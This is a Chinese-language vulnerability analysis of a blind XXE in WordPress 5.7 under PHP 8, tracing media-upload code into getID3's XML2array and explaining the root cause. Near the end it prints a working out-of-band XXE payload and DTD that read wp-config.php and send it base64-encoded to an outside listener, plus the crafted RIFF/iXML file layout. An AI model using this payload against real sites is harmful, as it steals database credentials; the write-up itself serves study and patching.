> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/9517)

0x0 前言
------

  这个洞是新爆出来的, 漏洞成因可以说是有点奇葩的，但正是这样导致很多人没发现，同时利用过程也是有一丢丢的复杂，下面是我分析和学习过程, 希望能给大家带来一点启发。

0x1 漏洞简介
--------

影响范围: WordPress <= 5.7 && php8

类型: Blind XXE

严重程度: 中高

关于 PHP8 局限范围的一些解读:

> 每个 PHP 的主要版本生命周期一般为 2 年（超过这个时间后官方不再维护更新），PHP 7.4 于 2019 年 11 月发布，作为 PHP 7 的最终版本，这意味着 PHP 7.4 要到 2022 年 11 月份才会走到它的 “生命尽头”。也就是说，到 2022 年 11 月份，所有流行的 PHP 程序都至少应该与 PHP 8 兼容，

0x2 环境搭建
--------

```
version: '3.8'
services:
  wordpress:
    container_name: wordpress-wpd
    restart: always
    image: wpdiaries/wordpress-xdebug:5.7-php8.0-apache
    ports:
      - "8010:80"
    environment:
      VIRTUAL_HOST: wordpress-test.com
      WORDPRESS_DB_HOST: db
      WORDPRESS_DB_NAME: wordpress
      WORDPRESS_DB_USER: root
      WORDPRESS_DB_PASSWORD: root
      XDEBUG_CONFIG: "remote_host=docker.for.mac.localhost idekey=PHPSTORM"
    depends_on:
      - db
    volumes:
      - /Users/xq17/工作区/研究进程/代码审计/wordpressSource:/var/www/html
    networks:
      - backend-wpd
      - frontend-wpd
  db:
    container_name: mysql-wpd
    image: mysql:8.0.20
    command: --default-authentication-plugin=mysql_native_password
    restart: always
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: wordpress
      MYSQL_USER: root
      MYSQL_PASSWORD: root
    networks:
      - backend-wpd
networks:
  frontend-wpd:
  backend-wpd:
```

这里需要注意下, 开启调试的话, 需要手工修改下 xdebug.ini

```
# Parameters description could be found here: https://xdebug.org/docs/remote
# Also, for PhpStorm, configuration tips could be found here: https://www.jetbrains.com/help/phpstorm/configuring-xdebug.html
zend_extension=xdebug.so
xdebug.mode=debug
xdebug.log_level=7
xdebug.log="/tmp/xdebug.log"
xdebug.idekey=PHPSTORM
xdebug.max_nesting_level=1500
xdebug.connect_timeout_ms=60000
# the default port for XDebug 3 is 9003, not 9000
xdebug.client_port=9003
# The line below is commented. This is the IP of your host machine, where your IDE is installed.
# We set this IP via XDEBUG_CONFIG environment variable in docker-compose.yml instead.
xdebug.client_host=docker.for.mac.localhost
xdebug.start_with_request=yes
xdebug.discover_client_host=true
```

0x3 分析思路
--------

wordpress 发布新版本的时候会提到[安全更新](https://wordpress.org/support/wordpress-version/version-5-7-1/#security-updates)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430211133-95f0b50e-a9b5-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430211133-95f0b50e-a9b5-1.png)

这里提到了 media Library, 然后我们去 github 直接对比下代码

Compare: 5.7 <-> 5.7.1

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430211156-a3d31e3c-a9b5-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430211156-a3d31e3c-a9b5-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430211225-b52bb018-a9b5-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430211225-b52bb018-a9b5-1.png)

0x4 漏洞分析
--------

### 0x4.1 漏洞点

```
/**
     * @param string $XMLstring
     *
     * @return array|false
     */
    public static function XML2array($XMLstring) {
        if (function_exists('simplexml_load_string') && function_exists('libxml_disable_entity_loader')) {
            if (PHP_VERSION_ID < 80000) {
                // http://websec.io/2012/08/27/Preventing-XEE-in-PHP.html
                // https://core.trac.wordpress.org/changeset/29378
                // This function has been deprecated in PHP 8.0 because in libxml 2.9.0, external entity loading is
                // disabled by default, so this function is no longer needed to protect against XXE attacks.
                $loader = libxml_disable_entity_loader(true);
            }
            $XMLobject = simplexml_load_string($XMLstring, 'SimpleXMLElement', LIBXML_NOENT);
            $return = self::SimpleXMLelement2array($XMLobject);
            if (PHP_VERSION_ID < 80000 && isset($loader)) {
                libxml_disable_entity_loader($loader);
            }
            return $return;
        }
        return false;
    }


```

说实话, 这个漏洞成因还是很简单的

如果 PHP 版本 >=8, 那么就不会调用`libxml_disable_entity_loader(true);`来禁止加载外部实体

那么最终`$XMLstring`这个参数的内容就会进入`simplexml_load_string`

```
$XMLobject = simplexml_load_string($XMLstring, 'SimpleXMLElement', LIBXML_NOENT);


```

本来 php8 的话启用的是 libxml2.9, 默认是不会加载外部实体的, 但是因为第三个参数启用了`LIBXML_NOENT`开启替换实体, 这样就会人为地修改了默认行为，从而导致了 XXE 攻击。

### 0x4.2 漏洞利用

找到了漏洞点, 并不一定说明存在漏洞，还是要找到路径到漏洞点，才能说明这是一个漏洞。

直接开始，全局搜索只有一个引用的地方

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430211308-ce59cc1e-a9b5-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430211308-ce59cc1e-a9b5-1.png)

代码比较简洁:

`wp-includes/ID3/module.audio-video.riff.php` 426 行 `getid3_riff`类

```
if (isset($thisfile_riff_WAVE['iXML'][0]['data'])) {
                    // requires functions simplexml_load_string and get_object_vars
                    if ($parsedXML = getid3_lib::XML2array($thisfile_riff_WAVE['iXML'][0]['data'])).....
......


```

```
$thisfile_riff_WAVE['iXML'][0]['data']

```

最终会作为`XML2array`的参数传进去解析, 那么我们继续回溯下这个参数是怎么来的。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430211330-dba8598a-a9b5-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430211330-dba8598a-a9b5-1.png)

继续查找:`$thisfile_riff`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430211348-e6b7e688-a9b5-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430211348-e6b7e688-a9b5-1.png)

然后跟上去发现是继承了父类的构造方法:

`/wp-includes/ID3/getid3.php` 1973 行

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430211414-f5ec8866-a9b5-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430211414-f5ec8866-a9b5-1.png)

那么我们继续回溯`getid3_riff`这个类的实例化就行了。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430211439-04d3e86a-a9b6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430211439-04d3e86a-a9b6-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430211451-0c0dc8bc-a9b6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430211451-0c0dc8bc-a9b6-1.png)

跟到这里, 其实我已经大概知道了那个信息是来源 RIFF 数据的, 也就是说来自于音频文件的, 那么到这里我心中大概有个底了, 觉得是有机会的。

有了这个基础, 我们就可以耐着性子，开始从函数调用，层层回溯下去了。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430211512-183c99ec-a9b6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430211512-183c99ec-a9b6-1.png)

那么只能搜索`Analyze`, 最终人眼排除 (说一下排除思路，就是要找`getid3_riff`类实例化调用的`Analyze`，不是的话就可以排除), 最终确定了两个地方。

第一个地方:

`/wp-includes/ID3/module.audio-video.riff.php` 1896 行，存在于`ParseRIFFdata`函数内

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430211550-2f51d6b0-a9b6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430211550-2f51d6b0-a9b6-1.png)

第二个地方:

`/wp-includes/ID3/getid3.php` 640 行 在`analyze`函数内部

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430211642-4de1f89e-a9b6-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430211642-4de1f89e-a9b6-1.png)

然后我继续看了下`$determined_format`这个变量的来源, 看他是不是会拼接成`getid3_riff`

选中之后，这个变量就会都被选中，然后前面找赋值

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430212257-2d675bb2-a9b7-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430212257-2d675bb2-a9b7-1.png)

跟进这个函数`GetFileFormat`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430212315-3856c0da-a9b7-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430212315-3856c0da-a9b7-1.png)

这里我们可以看到返回是`$info`, 然后按照顺序，果断先从文件内容解析格式, 解析失败了再从文件名入手。

, 然后关于这个内容，都是`GetFileFormatArray`来决定的，跟进

```
public function GetFileFormatArray() {
        static $format_info = array();
        if (empty($format_info)) {
            $format_info = array(

                ...
        'riff' => array(
        'pattern'   => '^(RIFF|SDSS|FORM)',
        'group'     => 'audio-video',
        'module'    => 'riff',
        'mime_type' => 'audio/wav',
        'fail_ape'  => 'WARNING',
        ),
                ....
        }
        return $format_info;
    }


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430212344-49687fd0-a9b7-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430212344-49687fd0-a9b7-1.png)

可以看到如果文件内容满足上面规则, 那么最终是有机会调用`getid3_riff`的, 因为其中存在 module=>'riff'。

搜索调用, 同样也有两处:

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430212356-50e8797c-a9b7-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430212356-50e8797c-a9b7-1.png)

第一处:

`/wp-admin/includes/media.php` 3549 行 在 `wp_read_video_metadata`函数

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430212418-5dec489c-a9b7-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430212418-5dec489c-a9b7-1.png)

第二处:

`/wp-admin/includes/media.php` 3660 行, 在`wp_read_audio_metadata`函数

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430212528-877afaaa-a9b7-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430212528-877afaaa-a9b7-1.png)

那么我继续找这两个函数的调用

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430212646-b62b3306-a9b7-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430212646-b62b3306-a9b7-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430212654-bae36256-a9b7-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430212654-bae36256-a9b7-1.png)

这两个函数很相似，限于文章篇幅、分析思路雷同，所以这里我只选取一个函数`wp_read_audio_metadata`来分析。

第一处:

`wp-admin/includes/image.php` 489 行, `wp_generate_attachment_metadata`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430212745-d93f3626-a9b7-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430212745-d93f3626-a9b7-1.png)

第二处:

`/wp-admin/includes/media.php` 321 行 `media_handle_upload`函数内

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430212803-e42754f6-a9b7-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430212803-e42754f6-a9b7-1.png)

这个代码可以说已经很直白了, 出现了`$_FILES`全局变量 (在这里，我不会去细究那些细节的实现的，我只要知道是否会经过就行了)

然后继续找这个调用

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430212836-f7eabfbe-a9b7-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430212836-f7eabfbe-a9b7-1.png)

然后找到一处:

`/wp-admin/includes/ajax-actions.php` 2549 行 `wp_ajax_upload_attachment`函数内

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430212858-04c7ee46-a9b8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430212858-04c7ee46-a9b8-1.png)

然后我们再找下`wp_ajax_upload_attachment`的调用点就行了。

`/wp-admin/async-upload.php` 33 行

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430212928-16e92842-a9b8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430212928-16e92842-a9b8-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430212944-20668cc0-a9b8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430212944-20668cc0-a9b8-1.png)

包含起来，然后调用这个函数, 请求`async-upload.php`页面, 然后`action=upload-attachment`, 就会调用了。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430213014-31d7d66c-a9b8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430213014-31d7d66c-a9b8-1.png)

### 0x4.3 调试过程

随便找一个能够拖拽上传的点

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430213038-40a6303a-a9b8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430213038-40a6303a-a9b8-1.png)

抓包就会发现, 是符合我们的分析的, 直接开启 xdebug 跟数据流就行了。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430213055-4abc26ba-a9b8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430213055-4abc26ba-a9b8-1.png)

断点我下在了

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430213130-5f3653fe-a9b8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430213130-5f3653fe-a9b8-1.png)

然后开始跟

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430213146-69297436-a9b8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430213146-69297436-a9b8-1.png)

这里有个小判断，可以绕过

```
Content-Disposition: form-data; 
Content-Type: audio/mpeg

```

然后也调用`finfo_file`检测文件的头几个字节来判断`$real_mime`

(这个可以自己去跟一下`wp_check_filetype_and_ext`, 做了一些文件的白名单的操作)

这里为了不必要的麻烦，我们直接去找一个现成的 mp3 文件就好了 (直接截取前面头一部分内容，emmm，蛮粗暴的)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430213208-76104bf2-a9b8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430213208-76104bf2-a9b8-1.png)

然后我们继续向下 debug:

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430213226-80903470-a9b8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430213226-80903470-a9b8-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430213242-8a65aebc-a9b8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430213242-8a65aebc-a9b8-1.png)

下面来到一些关键的地方了，需要认真调试了

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430213258-93a80f9c-a9b8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430213258-93a80f9c-a9b8-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430213305-98317d96-a9b8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430213305-98317d96-a9b8-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430213324-a3288e7e-a9b8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430213324-a3288e7e-a9b8-1.png)

这里读取了偏移 101B，32kb 大小的头部内容进去，然后这里就可以搜索`RIFF|SDSS|FORM`的数据了，emm。我们构造数据的话, 可以先大量填充，最终找到 101 个字节的位置，然后修改为 RIFF 作为开始就可以进入到关键的地方了。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430213350-b313e86a-a9b8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430213350-b313e86a-a9b8-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430213401-b97964f0-a9b8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430213401-b97964f0-a9b8-1.png)

但是来到这里，我们的数据，依然是不成功的，因为要符合 getid3 库去解析 RIFF 的格式，要不然是提取不到数据的。

第一次构造如下:

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430213414-c137ae2c-a9b8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430213414-c137ae2c-a9b8-1.png)

结果如下:

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430213433-cc499be0-a9b8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430213433-cc499be0-a9b8-1.png)

最终进入关键的函数，结合最前面的分析，直接就是`simple_load_xml`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430213452-d7c48160-a9b8-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430213452-d7c48160-a9b8-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430213610-0631fb36-a9b9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430213610-0631fb36-a9b9-1.png)

其实一开始我是没意识到那个位置代表的是 RIFF 的数据大小的，但是肯定有代表大小的区域，且为 4 字节，我试着填 FF 就发现了。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430213636-15c2aa5a-a9b9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430213636-15c2aa5a-a9b9-1.png)

其实格式是这样的 (感兴趣的话，可以直接跟一下解析就行了，这里直接给出我的结果):

```
RIFF|4字节随便填|WAVE|iXML|4字节代表xml内容大小|xml内容

```

### 0X4.4 构造 POC

这里因为没有回显，需要外带数据，所以可以这样构造:

```
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://docker.for.mac.localhost:8091/xxe.dtd">
%sp;
%param1;
]>
<r>&exfil;</r>>

```

xxe.dtd

```
<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=../wp-config.php">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://docker.for.mac.localhost:8092/?%data;'>">

```

POC 如下:

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430213841-60163e96-a9b9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430213841-60163e96-a9b9-1.png)

结果:

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430213825-567e1d5e-a9b9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430213825-567e1d5e-a9b9-1.png)

0X5 再看漏洞成因
----------

### 0x5.1 菜鸡碎碎念

其实我觉得，上面那些枯燥分析过程没必要去看，看成因然后自己去分析，出现问题再来看我的分析过程比对就可以了。给出我对这个漏洞的具体成因的理解，其实才是最重要的。

### 0x5.2 成因

首先问题出现在了 WP 内置的第三方库:[ID3](https://github.com/nass600/getID3)

emmm, 然后，直接搜索 github，发现确实是这个库，

[https://github.com/nass600/getID3/blob/master/getid3/getid3.lib.php](https://github.com/nass600/getID3/blob/master/getid3/getid3.lib.php) 522 行，感觉也很离谱, 如果 libxml<2.9 的话，这个函数就会一样有 XXE 漏洞。

```
static function XML2array($XMLstring) {
        if (function_exists('simplexml_load_string')) {
            if (function_exists('get_object_vars')) {
                $XMLobject = simplexml_load_string($XMLstring);
                return self::SimpleXMLelement2array($XMLobject);
            }
        }
        return false;
    }

```

然后我们再看 WordPress 中的这个函数，是做了 XXE 防护的，原来在 WP3.9.2 的时候确实因为这个库导致过一次 XXE。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430213931-7ddffb9c-a9b9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430213931-7ddffb9c-a9b9-1.png)

emm，当时做了修复:

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430213955-8c85e3be-a9b9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430213955-8c85e3be-a9b9-1.png)

本来这样就蛮安全的了，为什么 WP 还要改呢？ 这个问题就出现在了 WP 要向 PHP8 兼容

```
$loader = libxml_disable_entity_loader( true );

```

因为`libxml_disable_entity_loader`在 PHP8 是移除的了, 这个语句是会报错的，那么作为一个优雅的开发者，怎么修改呢？ 所以我当时 google 了下。

有篇文章 [https://php.watch/versions/8.0/libxml_disable_entity_loader-deprecation, 就介绍了如何解决这个问题。](https://php.watch/versions/8.0/libxml_disable_entity_loader-deprecation,%E5%B0%B1%E4%BB%8B%E7%BB%8D%E4%BA%86%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E8%BF%99%E4%B8%AA%E9%97%AE%E9%A2%98%E3%80%82)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430214025-9e57f1a4-a9b9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430214025-9e57f1a4-a9b9-1.png)

emmm，是不是，然后我们回头看 WP 的代码，是不是很像，其实文章没有错，只不过，没有解释如果出现了第三个参数情况，那么默认配置不解析外部实体就会被第三个参数更改，导致了 XXE。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430214055-afe9c62c-a9b9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430214055-afe9c62c-a9b9-1.png)

然后看这个注释，emmm，只能说，开发者不是神，同样是人，一个应用不可能永远没有漏洞的，这个就是一个很好的例子。

### 0x5.3 聊一下 LIBXML_NOENT

其实我对这个函数也不是很懂， 其实也不是很清楚 WP 为何执意用这个，但是查看返回值确实是存在差异的。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430214117-bd8004cc-a9b9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430214117-bd8004cc-a9b9-1.png)

猜想:

> 参数的作用就是在内部替换了实体，这样就不会出现实体节点，这样解析下来遇到实体的话就需要解析，底层实现的时候，解析到外部实体，所以可以导致 XXE。

所以有时候这个参数是可以在一定程度简化代码的，但是要禁止外部实体的解析，我们依然要跟 WP 那样，加多一个 @，屏蔽错误，这个操作依然是有效去防范 xxe 攻击加载外部实体的。

```
$loader = @libxml_disable_entity_loader(true);


```

不过官方提到这个参数, 说如果需要使用内部实体解析的时候，那就需要带上第三个参数。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210430214144-cd610f80-a9b9-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210430214144-cd610f80-a9b9-1.png)

很迷，感觉这个说话不算很可靠，就算不需要这个，也是能解析内部实体的，希望有师傅能从开发角度说说差异。

0x6 总结
------

  文章从漏洞基本情况，环境搭建，分析思路，具体分析过程到成因分析，基本还原了笔者学习一个新漏洞的过程。其中可以发现，笔者更偏向于模拟漏洞发现者的思路开始回溯分析 (未知)，而不是 poc->debug(已知), 因为这样的模式可以让笔者印象更加深刻，也能发现更多的利用点。

  关于本文还是有些遗憾的地方，就是还有很多触发点没去分析，目前的话，基本可以确定调用 ID3 库的 analy 函数的话就可以攻击，范围更小一点就是支持上传的点也可能可以，然后衍生下思路，一些 wp 的插件如果引用这个功能的话，那么也会 XXE。欢迎师傅们继续深入研究，产出更多 0day。

0x7 参考链接
--------

[WordPress 5.7 XXE Vulnerability](https://blog.sonarsource.com/wordpress-xxe-security-vulnerability/?utm_source=twitter&utm_medium=social&utm_campaign=wordpress&utm_content=security&utm_term=mofu)

[Docker+PhpStorm 远程调试 php](http://badaozhenjun.com/posts/2077109e/)